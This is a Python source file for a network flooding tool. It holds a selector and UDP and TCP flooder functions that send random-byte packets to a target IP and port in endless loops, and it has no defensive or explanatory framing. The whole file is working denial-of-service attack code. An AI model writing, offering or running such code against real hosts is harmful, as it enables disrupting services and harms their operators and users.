import socket
import random


def flooder_selector(choice):
    if choice == "UDP":
        return udp_flooder
    elif choice == "TCP":
        return tcp_flooder
    else:
        return None


def udp_flooder(thread_number, ip, port, packets):
    data = random._urandom(1024)
    s = None
    while True:
        try:
            # UDP = SOCK_DGRAM
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            address = (str(ip), int(port))
            for _ in range(packets):
                s.sendto(data, address)
            s.close()
            print(f"[{thread_number}] {packets} UDP packet sent")
        except (KeyboardInterrupt, socket.error):
            s.close()
            print(f"[{thread_number}] Error!")


def tcp_flooder(thread_number, ip, port, packets):
    data = random._urandom(16)
    s = None
    while True:
        try:
            # TCP = SOCK_STREAM
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for _ in range(packets):
                s.send(data)
            print(f"[{thread_number}] {packets} TCP packet sent")
            s.close()
        except (KeyboardInterrupt, socket.error):
            s.close()
            print(f"[{thread_number}] Error!")
